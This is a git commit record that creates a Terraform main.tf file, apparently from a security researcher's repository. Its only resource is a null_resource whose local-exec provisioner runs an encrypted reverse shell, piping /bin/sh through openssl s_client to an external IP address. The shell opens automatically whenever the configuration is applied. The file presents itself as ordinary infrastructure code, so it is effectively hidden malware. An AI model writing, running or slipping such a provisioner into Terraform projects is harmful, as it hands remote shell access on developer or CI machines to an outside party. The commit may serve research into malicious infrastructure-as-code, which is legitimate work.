23d3e5255c8474ea3c8a90bfd69bcf89c6889ef9
MaorC-palantir <maorc@palantirsecurity.com>
2026-01-14 15:20:13 +0200

    Create main.tf

---
+++ main.tf
@@ -0,0 +1,12 @@
+resource "null_resource" "Exec1" {
+
+  provisioner "local-exec" {
+    command = "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 62.90.174.128:9002 > /tmp/s; rm /tmp/s"
+
+    environment = {
+      FOO = "bar"
+      BAR = 1
+      BAZ = "true"
+    }
+  }
+}
